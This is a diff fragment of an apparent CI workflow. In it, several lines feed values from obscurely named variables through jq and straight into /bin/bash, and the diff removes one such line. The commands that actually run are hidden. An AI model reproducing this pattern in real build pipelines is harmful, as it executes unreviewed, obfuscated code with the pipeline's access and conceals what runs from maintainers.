@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$cn3" | jq -r .kyvbx0 | /bin/bash
           echo $f752 | jq -r .mlau448 | /bin/bash
           printf '%s' "$utb792" | jq -r .sl612 | /bin/bash
-          echo $ine4920 | jq -r .od86 | /bin/bash
           echo $k3189 | jq -r .w1 | /bin/bash
 
       - name: Persist results
